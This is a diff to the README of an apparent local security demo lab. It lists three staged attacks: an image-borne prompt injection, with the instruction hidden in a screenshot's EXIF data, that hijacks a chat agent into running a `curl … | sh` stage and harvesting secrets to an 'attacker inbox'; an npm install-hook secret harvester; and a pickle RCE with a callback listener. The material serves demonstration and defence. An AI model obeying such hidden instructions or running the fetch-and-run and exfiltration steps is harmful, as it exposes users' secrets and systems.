@@ -51,7 +51,7 @@ Desktop, and host ports are bound to **loopback only**.
 
 | Act | Do this | Watch |
 | --- | --- | --- |
-| **A — Agent hijack** (headline) | open <http://localhost:8080>, chat, then drop `agent-chat/poisoned_onboarding.png` | OCR → `run_command` → `PWNED … as root` → summary |
+| **A — Agent hijack** (headline) | open <http://localhost:8080>, chat, then drop `agent-chat/poisoned_onboarding.jpg` | pixels clean; EXIF → `curl …/stage \| sh` → harvests secrets → **attacker inbox** <http://localhost:9000> |
 | **B — npm supply-chain exfil** | `docker exec demo-npm-victim npm install` | the attacker inbox at <http://localhost:9000> |
 | **C — pickle RCE** | regen payload (`LISTENER_HOST=demo-listener`), POST to <http://localhost:5001/load> | `docker logs -f demo-listener` |
 
@@ -63,7 +63,7 @@ operator run-of-show) and each demo's README.
 | Path | What |
 | --- | --- |
 | `stage/` | `bootstrap.sh`, `up.sh`, `status.sh`, `down.sh`, and `docker-compose.yml` (the `agent-attack-lab` project) |
-| `agent-chat/` | the image-drop chat app; **the poisoned image is `agent-chat/poisoned_onboarding.png`** (regenerable with `author_image.py`) |
+| `agent-chat/` | the image-drop chat app; **the poisoned image is `agent-chat/poisoned_onboarding.jpg`** — a clean screenshot with the instruction in EXIF metadata (regenerable with `author_image.py`) |
 | `collector/` | the "attacker inbox" web service |
 | `shell-demos/npm-supplychain/` | the install-hook harvester + `fixtures/` (planted fake secrets) |
 | `shell-demos/pickle-rce/` | the pickle RCE Flask app + `make_payload.py` |
